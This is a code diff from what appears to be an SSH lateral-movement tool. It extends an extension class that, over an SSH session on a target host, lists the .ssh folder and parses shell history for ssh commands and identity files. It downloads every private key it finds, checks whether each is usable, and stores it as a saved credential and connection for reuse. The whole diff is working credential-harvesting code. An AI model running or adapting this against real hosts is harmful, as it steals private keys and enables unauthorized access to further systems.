@@ -9,6 +9,7 @@ from src.endpoint import Endpoint
 from src.user import User
 from src.path import Path
 from src.creds import Creds
+from src.connection import Connection
 from paramiko.rsakey import RSAKey
 from paramiko.ecdsakey import ECDSAKey
 from paramiko.dsskey import DSSKey
@@ -77,16 +78,6 @@ def gatherFromKnown(homedir,hosts,hostsInConfig):
 
     print("Found "+str(nbHosts)+" hosts in known_hosts")
 
-def misc():
-    hosts = []
-    gatherFromConfig(sshConfFile,hosts)
-    hostsInConfig = []
-    for host in hosts:
-        hostsInConfig.append(host.name)
-    for f in listHistoryFiles(homedir):
-        gatherFromHistory(f,hosts,hostsInConfig)
-    gatherFromKnown(homedir,hosts,hostsInConfig)
-    print("Found "+str(len(hosts))+" hosts in all sources")
 '''
 
 class ExtStr(type):
@@ -115,10 +106,8 @@ class BaboosshExt(object,metaclass=ExtStr):
     @classmethod
     def run(cls,socket, connection, wspaceFolder):
         g = cls(socket,connection, wspaceFolder)
-        #TODO move run to Try block
-        g.gather()
         try:
-            pass
+            g.gather()
         except Exception as e:
             print("Error : "+str(e))
             return False
@@ -131,29 +120,39 @@ class BaboosshExt(object,metaclass=ExtStr):
         self.gatherKeys()
 
     def gatherKeys(self):
-        from src.params import Extensions
         files = []
         ret = []
         result = self.socket.run("ls -A .ssh",hide=True)
         for line in result.stdout.splitlines():
             if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                 files.append(line)
-        keysFolder = os.path.join(self.wspaceFolder,"keys")
         for keyfile in files:
-            filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_"+keyfile
-            filepath = os.path.join(keysFolder,filename)
-            self.socket.get(os.path.join(".ssh",keyfile),filepath)
-            subprocess.run(["chmod","600",filepath])
-            valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
-            if valid:
-                c= { "passphrase":"","keypath":filepath,"haspass":haspass}
-                cred = Creds("privkey",json.dumps(c))
-                cred.save()
-                ret.append(cred)
-            else:
-                os.remove(filepath)
+            c = self.getKeyToCreds(keyfile)
+            if c != None:
+                ret.append(c)
         print("Found "+str(len(ret))+" private keys")
 
+    def getKeyToCreds(self,keyfile,basePath=".ssh"):
+        if basePath != ".":
+            keyfile = os.path.join(basePath,keyfile)
+        from src.params import Extensions
+        keysFolder = os.path.join(self.wspaceFolder,"keys")
+        filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_"+keyfile.replace("/","_")
+        filepath = os.path.join(keysFolder,filename)
+        try:
+            self.socket.get(keyfile,filepath)
+        except Exception as e:
+            return None
+        subprocess.run(["chmod","600",filepath])
+        valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
+        if valid:
+            c= { "passphrase":"","keypath":filepath,"haspass":haspass}
+            cred = Creds("privkey",json.dumps(c))
+            cred.save()
+            return cred
+        else:
+            os.remove(filepath)
+        return None
 
     def listHistoryFiles(self):
         ret = []
@@ -168,6 +167,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         lines = result.stdout.splitlines()
         nbEndpoints = 0
         nbUsers = 0
+        nbCreds = 0
         for line in lines:
             if re.search(r'^ *ssh ',line):
                 option = ""
@@ -224,8 +224,13 @@ class BaboosshExt(object,metaclass=ExtStr):
                     user.save()
                     nbUsers = nbUsers + 1
                 if identity is not None:
-                    #TODO fetch key and create cred object
-                    continue
-        print("Found "+str(nbEndpoints)+" enpoints and "+str(nbUsers)+" users in "+historyFile)
+                    identity = self.getKeyToCreds(identity,".")
+                    if identity != None:
+                        nbCreds = nbCreds+1
+                if user is not None and identity is not None:
+                   conn = Connection(endpoint,user,identity)
+                   conn.save()
+
+        print("Found "+str(nbEndpoints)+" enpoints, "+str(nbUsers)+" users and "+str(nbCreds)+" creds in "+historyFile)
 
 
